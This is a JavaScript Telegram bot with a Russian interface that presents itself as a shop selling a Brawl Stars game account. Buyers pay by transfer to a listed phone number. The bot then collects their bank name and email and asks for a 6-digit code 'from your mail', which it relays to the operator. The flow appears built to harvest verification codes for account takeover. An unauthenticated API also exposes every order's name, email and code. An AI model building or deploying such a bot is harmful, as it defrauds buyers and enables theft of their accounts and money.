require('dotenv').config();
const { Telegraf, session, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const orders = new Map();
const pendingEmailByChatId = new Map();

function generateOrderId() {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
}

const ACCOUNTS = [
  {
    id: 'acc-29444',
    title: 'Brawl Stars — 29 444 кубка',
    trophies: 29444,
    fighters: 65,
    price: 800,
    year: 2024,
    imageUrl: 'https://i.ibb.co/qYT3zH2F/photo-2026-06-20-23-05-47.jpg',
  },
];

function getAccountById(id) {
  return ACCOUNTS.find(a => a.id === id) || null;
}

function formatPrice(price) {
  return new Intl.NumberFormat('ru-RU').format(price) + ' ₽';
}

function escapeMarkdown(text) {
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

// =====================
// ЭКРАНЫ
// =====================

function screenCatalog(index) {
  const account = ACCOUNTS[index];
  const caption =
    `🏆 *${escapeMarkdown(account.title)}*\n\n` +
    `🥇 Кубки: *${account.trophies.toLocaleString('ru-RU')}*\n` +
    `⚔️ Бойцы: *${account.fighters}*\n` +
    `📅 Год: *${account.year}*\n` +
    `💰 Цена: *${escapeMarkdown(formatPrice(account.price))}*`;

  const navRow = [];
  if (index > 0) navRow.push(Markup.button.callback('◀ Назад', `catalog_${index - 1}`));
  if (index < ACCOUNTS.length - 1) navRow.push(Markup.button.callback('Вперёд ▶', `catalog_${index + 1}`));
  const rows = [];
  if (navRow.length > 0) rows.push(navRow);
  rows.push([Markup.button.callback(`🛒 Купить за ${formatPrice(account.price)}`, `buy_${account.id}`)]);

  return {
    type: 'photo',
    imageUrl: account.imageUrl,
    caption,
    keyboard: Markup.inlineKeyboard(rows),
  };
}

function screenPayment(account) {
  const text =
    `💳 *Оплата заказа*\n\n` +
    `🎮 Аккаунт: *${escapeMarkdown(account.title)}*\n` +
    `💰 Сумма: *${escapeMarkdown(formatPrice(account.price))}*\n\n` +
    `📱 *Реквизиты СБП:*\n` +
    `📞 Номер: *\\+7 902 917\\-54\\-45*\n\n` +
    `Переведите сумму и нажмите кнопку ниже 👇`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('✅ Я оплатил', `paid_${account.id}`)],
    [Markup.button.callback('◀ Назад к каталогу', `back_catalog`)],
  ]);

  return { type: 'text', text, keyboard };
}

function screenEnterName(account) {
  const text =
    `✍️ *Введите ваше имя*\n\n` +
    `Напишите *полное имя и первую букву фамилии*\n` +
    `_Например: Александр К_\n\n` +
    `⚠️ Укажите имя точно как в банке при переводе\\.\n\n` +
    `💰 Сумма: *${escapeMarkdown(formatPrice(account.price))}*\n` +
    `📞 На номер: *\\+7 902 917\\-54\\-45*`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('◀ Назад', `back_payment_${account.id}`)],
  ]);

  return { type: 'text', text, keyboard };
}

function screenWaiting(orderId, buyerName) {
  const text =
    `⏳ *Ожидайте подтверждения*\n\n` +
    `Заказ: *\\#${escapeMarkdown(orderId)}*\n` +
    `Имя: *${escapeMarkdown(buyerName)}*\n\n` +
    `Продавец проверяет ваш перевод по имени\\.\n` +
    `Как только оплата подтвердится — бот сообщит вам\\.`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('◀ Отменить заказ', `cancel_${orderId}`)],
  ]);

  return { type: 'text', text, keyboard };
}

function screenEnterEmail(orderId) {
  const text =
    `🎉 *Оплата подтверждена\\!*\n\n` +
    `Заказ: *\\#${escapeMarkdown(orderId)}*\n\n` +
    `Напишите ваш *email* прямо сюда в чат:\n` +
    `_Например: example@mail\\.ru_`;

  return { type: 'text', text, keyboard: Markup.inlineKeyboard([]) };
}

function screenEnterCode(email) {
  const text =
    `📬 *Проверьте почту\\!*\n\n` +
    `На адрес *${escapeMarkdown(email)}* пришло письмо с кодом\\.\n\n` +
    `Введите *6\\-значный код* прямо сюда в чат:`;

  return { type: 'text', text, keyboard: Markup.inlineKeyboard([]) };
}

function screenCodeWaiting() {
  const text =
    `⏳ *Код принят\\!*\n\n` +
    `Продавец проверяет код и завершает передачу аккаунта\\.\n` +
    `Пожалуйста, подождите\\.\\.\\.`;

  return { type: 'text', text, keyboard: Markup.inlineKeyboard([]) };
}

function screenSuccess(accountTitle) {
  const text =
    `🎉 *Поздравляем\\! Заказ завершён\\!*\n\n` +
    `🏆 Аккаунт *${escapeMarkdown(accountTitle)}* передан вам\\.\n\n` +
    `Спасибо за покупку\\!\n` +
    `По вопросам: @brawlhelpp`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🏠 Вернуться в каталог', 'back_catalog')],
  ]);

  return { type: 'text', text, keyboard };
}

function screenRejected() {
  const text =
    `❌ *Заказ отклонён*\n\n` +
    `Оплата не найдена или имя не совпало\\.\n` +
    `Если уже перевели деньги — напишите: @brawlhelpp`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('◀ Вернуться в каталог', 'back_catalog')],
  ]);

  return { type: 'text', text, keyboard };
}

// =====================
// ОТРИСОВКА ГЛАВНОГО СООБЩЕНИЯ
// =====================

// Отправить или отредактировать главное сообщение
async function showScreen(ctx, screen) {
  ctx.session = ctx.session || {};
  const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
  const mainMsgId = ctx.session.mainMsgId;
  const mainMsgType = ctx.session.mainMsgType; // 'photo' или 'text'

  if (screen.type === 'photo') {
    // Нужно показать фото
    if (mainMsgId && mainMsgType === 'photo') {
      // Уже фото — редактируем медиа
      try {
        await bot.telegram.editMessageMedia(
          chatId, mainMsgId, null,
          { type: 'photo', media: screen.imageUrl, caption: screen.caption, parse_mode: 'MarkdownV2' },
          { reply_markup: screen.keyboard.reply_markup }
        );
        return;
      } catch (e) {}
    }

    // Удалить старое сообщение если было
    if (mainMsgId) {
      try { await bot.telegram.deleteMessage(chatId, mainMsgId); } catch (e) {}
    }

    // Отправить новое фото
    const sent = await bot.telegram.sendPhoto(chatId, screen.imageUrl, {
      caption: screen.caption,
      parse_mode: 'MarkdownV2',
      reply_markup: screen.keyboard.reply_markup,
    });
    ctx.session.mainMsgId = sent.message_id;
    ctx.session.mainMsgType = 'photo';

  } else {
    // Текстовый экран
    if (mainMsgId && mainMsgType === 'text') {
      // Редактируем текст
      try {
        await bot.telegram.editMessageText(
          chatId, mainMsgId, null,
          screen.text,
          { parse_mode: 'MarkdownV2', reply_markup: screen.keyboard.reply_markup }
        );
        return;
      } catch (e) {}
    }

    // Удалить старое сообщение
    if (mainMsgId) {
      try { await bot.telegram.deleteMessage(chatId, mainMsgId); } catch (e) {}
    }

    // Отправить новое текстовое
    const sent = await bot.telegram.sendMessage(chatId, screen.text, {
      parse_mode: 'MarkdownV2',
      reply_markup: screen.keyboard.reply_markup,
    });
    ctx.session.mainMsgId = sent.message_id;
    ctx.session.mainMsgType = 'text';
  }
}

// Версия для вызова из обработчиков текста (нет ctx.chat напрямую)
async function showScreenByChatId(chatId, session, screen) {
  const mainMsgId = session.mainMsgId;
  const mainMsgType = session.mainMsgType;

  if (screen.type === 'photo') {
    if (mainMsgId && mainMsgType === 'photo') {
      try {
        await bot.telegram.editMessageMedia(
          chatId, mainMsgId, null,
          { type: 'photo', media: screen.imageUrl, caption: screen.caption, parse_mode: 'MarkdownV2' },
          { reply_markup: screen.keyboard.reply_markup }
        );
        return;
      } catch (e) {}
    }
    if (mainMsgId) {
      try { await bot.telegram.deleteMessage(chatId, mainMsgId); } catch (e) {}
    }
    const sent = await bot.telegram.sendPhoto(chatId, screen.imageUrl, {
      caption: screen.caption,
      parse_mode: 'MarkdownV2',
      reply_markup: screen.keyboard.reply_markup,
    });
    session.mainMsgId = sent.message_id;
    session.mainMsgType = 'photo';
  } else {
    if (mainMsgId && mainMsgType === 'text') {
      try {
        await bot.telegram.editMessageText(
          chatId, mainMsgId, null,
          screen.text,
          { parse_mode: 'MarkdownV2', reply_markup: screen.keyboard.reply_markup }
        );
        return;
      } catch (e) {}
    }
    if (mainMsgId) {
      try { await bot.telegram.deleteMessage(chatId, mainMsgId); } catch (e) {}
    }
    const sent = await bot.telegram.sendMessage(chatId, screen.text, {
      parse_mode: 'MarkdownV2',
      reply_markup: screen.keyboard.reply_markup,
    });
    session.mainMsgId = sent.message_id;
    session.mainMsgType = 'text';
  }
}

// Временное сообщение (ошибка/подсказка) — само удаляется
async function tempMessage(ctx, text, delay = 4000) {
  const chatId = ctx.chat?.id;
  if (!chatId) return;
  try {
    const sent = await bot.telegram.sendMessage(chatId, text);
    setTimeout(() => bot.telegram.deleteMessage(chatId, sent.message_id).catch(() => {}), delay);
  } catch (e) {}
}

// =====================
// СТАРТ
// =====================
bot.start(async (ctx) => {
  ctx.session = {};
  await ctx.reply(
    '👋 Привет! Это магазин аккаунтов Brawl Stars.\n\nВыбери действие:',
    Markup.keyboard([['📋 Каталог аккаунтов'], ['❓ Помощь']]).resize()
  );
});

// =====================
// КАТАЛОГ
// =====================
bot.hears('📋 Каталог аккаунтов', async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.step = 'catalog';
  ctx.session.catalogIndex = 0;
  await showScreen(ctx, screenCatalog(0));
});

bot.action(/^catalog_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1], 10);
  if (index < 0 || index >= ACCOUNTS.length) return ctx.answerCbQuery();
  ctx.session.catalogIndex = index;
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery();
  await showScreen(ctx, screenCatalog(index));
});

bot.action('back_catalog', async (ctx) => {
  ctx.session = ctx.session || {};
  const index = ctx.session.catalogIndex || 0;
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery();
  await showScreen(ctx, screenCatalog(index));
});

// =====================
// КУПИТЬ
// =====================
bot.action(/^buy_(.+)$/, async (ctx) => {
  const account = getAccountById(ctx.match[1]);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'payment';
  await ctx.answerCbQuery();
  await showScreen(ctx, screenPayment(account));
});

bot.action(/^back_payment_(.+)$/, async (ctx) => {
  const account = getAccountById(ctx.match[1]);
  if (!account) return ctx.answerCbQuery();
  ctx.session.step = 'payment';
  await ctx.answerCbQuery();
  await showScreen(ctx, screenPayment(account));
});

// =====================
// Я ОПЛАТИЛ → ввод имени
// =====================
bot.action(/^paid_(.+)$/, async (ctx) => {
  const account = getAccountById(ctx.match[1]);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'awaiting_name';
  await ctx.answerCbQuery();
  await showScreen(ctx, screenEnterName(account));
});

// =====================
// ОТМЕНА
// =====================
bot.action(/^cancel_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (order && order.status === 'pending') {
    order.status = 'cancelled';
    orders.set(orderId, order);
  }
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery('Заказ отменён');
  await showScreen(ctx, screenCatalog(ctx.session.catalogIndex || 0));
});

// =====================
// MIDDLEWARE: восстановить step если ждём email
// =====================
bot.use(async (ctx, next) => {
  if (ctx.message?.text) {
    ctx.session = ctx.session || {};
    const chatId = String(ctx.chat?.id);
    const pendingOrderId = pendingEmailByChatId.get(chatId);
    if (pendingOrderId && ctx.session.step !== 'awaiting_email') {
      ctx.session.step = 'awaiting_email';
      ctx.session.orderId = pendingOrderId;
      pendingEmailByChatId.delete(chatId);
    }
  }
  return next();
});

// =====================
// ОБРАБОТКА ТЕКСТА
// =====================
bot.on('text', async (ctx) => {
  ctx.session = ctx.session || {};
  const text = ctx.message.text.trim();
  const step = ctx.session.step;

  // Удалить сообщение пользователя
  try { await ctx.deleteMessage(); } catch (e) {}

  if (text === '❓ Помощь') {
    await tempMessage(ctx,
      '📞 По вопросам: @brawlhelpp\n\n' +
      '1️⃣ Каталог → выберите аккаунт\n' +
      '2️⃣ Оплатите через СБП\n' +
      '3️⃣ Нажмите "Я оплатил"\n' +
      '4️⃣ Введите имя как в банке\n' +
      '5️⃣ Дождитесь подтверждения\n' +
      '6️⃣ Введите email\n' +
      '7️⃣ Проверьте почту, введите код\n' +
      '8️⃣ Готово! 🏆',
      8000
    );
    return;
  }
  if (text === '📋 Каталог аккаунтов') return;

  // ШАГ: ввод имени
  if (step === 'awaiting_name') {
    if (text.length < 3) {
      await tempMessage(ctx, '❌ Введите полное имя и первую букву фамилии.\nНапример: Александр К');
      return;
    }
    const account = getAccountById(ctx.session.selectedAccountId);
    if (!account) {
      ctx.session.step = 'catalog';
      await showScreenByChatId(ctx.chat.id, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
      return;
    }

    ctx.session.buyerName = text;
    ctx.session.step = 'awaiting_admin_confirm';

    const orderId = generateOrderId();
    orders.set(orderId, {
      orderId, buyerName: text, email: null,
      accountId: account.id, accountTitle: account.title,
      price: account.price, status: 'pending', code: null,
      chatId: String(ctx.chat.id), createdAt: new Date().toISOString(),
    });
    ctx.session.orderId = orderId;

    await showScreenByChatId(ctx.chat.id, ctx.session, screenWaiting(orderId, text));

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID,
          `🆕 *Новый заказ \\#${escapeMarkdown(orderId)}*\n\n` +
          `👤 Имя: *${escapeMarkdown(text)}*\n` +
          `🎮 ${escapeMarkdown(account.title)}\n` +
          `🏆 ${account.trophies.toLocaleString('ru-RU')} кубков\n` +
          `💰 ${escapeMarkdown(formatPrice(account.price))}\n\n` +
          `Проверьте перевод по имени:`,
          {
            parse_mode: 'MarkdownV2',
            reply_markup: { inline_keyboard: [[
              { text: '✅ Подтвердить', callback_data: `fulfill_${orderId}` },
              { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
            ]]},
          }
        );
      } catch (e) { console.warn(e.message); }
    }
    return;
  }

  if (step === 'awaiting_admin_confirm') {
    await tempMessage(ctx, '⏳ Ваш заказ на проверке. Дождитесь подтверждения от продавца.');
    return;
  }

  // ШАГ: ввод email
  if (step === 'awaiting_email') {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) {
      await tempMessage(ctx, '❌ Неверный формат email. Например: example@mail.ru');
      return;
    }
    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = 'catalog';
      await showScreenByChatId(ctx.chat.id, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
      return;
    }

    order.email = text;
    orders.set(orderId, order);
    ctx.session.step = 'awaiting_code_from_email';

    await showScreenByChatId(ctx.chat.id, ctx.session, screenEnterCode(text));

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID,
          `📧 *Заказ \\#${escapeMarkdown(orderId)}*\n\n` +
          `👤 ${escapeMarkdown(order.buyerName)}\n` +
          `📧 *${escapeMarkdown(text)}*\n\n` +
          `Нажмите чтобы запросить код у покупателя:`,
          {
            parse_mode: 'MarkdownV2',
            reply_markup: { inline_keyboard: [[
              { text: '📨 Запросить код', callback_data: `askcode_${orderId}` },
            ]]},
          }
        );
      } catch (e) { console.warn(e.message); }
    }
    return;
  }

  // ШАГ: ввод кода
  if (step === 'awaiting_code_from_email') {
    if (!/^\d{6}$/.test(text)) {
      await tempMessage(ctx, '❌ Код должен состоять из 6 цифр. Проверьте письмо и попробуйте ещё раз.');
      return;
    }
    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = 'catalog';
      await showScreenByChatId(ctx.chat.id, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
      return;
    }

    order.code = text;
    order.status = 'code_received';
    orders.set(orderId, order);
    ctx.session.step = 'awaiting_final_confirm';

    await showScreenByChatId(ctx.chat.id, ctx.session, screenCodeWaiting());

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(ADMIN_CHAT_ID,
          `🔑 *Заказ \\#${escapeMarkdown(orderId)}* — код от покупателя:\n\n` +
          `👤 ${escapeMarkdown(order.buyerName)}\n` +
          `📧 ${escapeMarkdown(order.email)}\n` +
          `🔑 Код: *${escapeMarkdown(text)}*\n\n` +
          `Проверьте и завершите заказ:`,
          {
            parse_mode: 'MarkdownV2',
            reply_markup: { inline_keyboard: [[
              { text: '✅ Завершить заказ', callback_data: `complete_${orderId}` },
              { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
            ]]},
          }
        );
      } catch (e) { console.warn(e.message); }
    }
    return;
  }

  if (step === 'awaiting_final_confirm') {
    await tempMessage(ctx, '⏳ Продавец проверяет код. Совсем скоро!');
    return;
  }
});

// =====================
// КНОПКИ АДМИНА
// =====================
bot.action(/^fulfill_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');
  if (order.status !== 'pending') return ctx.answerCbQuery('⚠️ Уже обработан');

  order.status = 'confirmed';
  orders.set(orderId, order);
  pendingEmailByChatId.set(String(order.chatId), orderId);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Подтверждено!');
  await ctx.reply(`✅ Заказ #${orderId} подтверждён. Ожидаю email от покупателя...`);

  // Найти сессию покупателя через sessions — обновить экран
  const buyerChatId = Number(order.chatId);
  try {
    // Отправим новый экран напрямую (сессия покупателя обновится через pendingEmailByChatId)
    const sent = await bot.telegram.sendMessage(buyerChatId,
      `🎉 *Оплата подтверждена\\!*\n\n` +
      `Заказ: *\\#${escapeMarkdown(orderId)}*\n\n` +
      `Напишите ваш *email* прямо сюда в чат:\n` +
      `_Например: example@mail\\.ru_`,
      { parse_mode: 'MarkdownV2' }
    );
    // Сохраним новый mainMsgId через временный store
    buyerMainMsgStore.set(String(buyerChatId), { msgId: sent.message_id, type: 'text' });
  } catch (e) { console.warn(e.message); }
});

// Хранилище mainMsgId для покупателей (когда обновляем из обработчика админа)
const buyerMainMsgStore = new Map();

bot.action(/^askcode_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('📨 Запрос отправлен');
  await ctx.reply(`📨 Запрос кода отправлен покупателю (заказ #${orderId})`);

  if (order.chatId) {
    try {
      const sent = await bot.telegram.sendMessage(order.chatId,
        `📬 *Проверьте почту\\!*\n\n` +
        `На адрес *${escapeMarkdown(order.email)}* пришло письмо с кодом\\.\n\n` +
        `Введите *6\\-значный код* прямо сюда в чат:`,
        { parse_mode: 'MarkdownV2' }
      );
      buyerMainMsgStore.set(String(order.chatId), { msgId: sent.message_id, type: 'text' });
    } catch (e) { console.warn(e.message); }
  }
});

bot.action(/^complete_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');

  order.status = 'fulfilled';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Завершено!');
  await ctx.reply(`🏆 Заказ #${orderId} завершён!\n👤 ${order.buyerName} | 📧 ${order.email} | 🔑 ${order.code}`);

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(order.chatId,
        `🎉 *Поздравляем\\! Заказ завершён\\!*\n\n` +
        `🏆 Аккаунт *${escapeMarkdown(order.accountTitle)}* передан вам\\.\n\n` +
        `Спасибо за покупку\\! По вопросам: @brawlhelpp`,
        { parse_mode: 'MarkdownV2' }
      );
    } catch (e) { console.warn(e.message); }
  }
});

bot.action(/^reject_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');
  if (order.status === 'fulfilled') return ctx.answerCbQuery('⚠️ Уже завершён');

  order.status = 'rejected';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('❌ Отклонено');
  await ctx.reply(`❌ Заказ #${orderId} отклонён.`);

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(order.chatId,
        `❌ *Заказ \\#${escapeMarkdown(orderId)} отклонён\\.*\n\n` +
        `Если уже перевели деньги — напишите: @brawlhelpp`,
        { parse_mode: 'MarkdownV2' }
      );
    } catch (e) { console.warn(e.message); }
  }
});

// =====================
// EXPRESS + API
// =====================
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.get('/', (req, res) => res.json({ ok: true, message: 'Bot is running' }));

app.get('/api/orders', (req, res) => {
  const list = Array.from(orders.values()).sort(
    (a, b) => new Date(b.createdAt) - new Date(a.createdAt)
  );
  res.json({ orders: list });
});

app.get('/api/order/:id', (req, res) => {
  const order = orders.get(req.params.id);
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json({
    orderId: order.orderId,
    status: order.status,
    code: order.status === 'fulfilled' ? order.code : null,
    accountTitle: order.accountTitle,
    price: order.price,
    createdAt: order.createdAt,
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));

bot.launch();
console.log('✅ Bot started');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
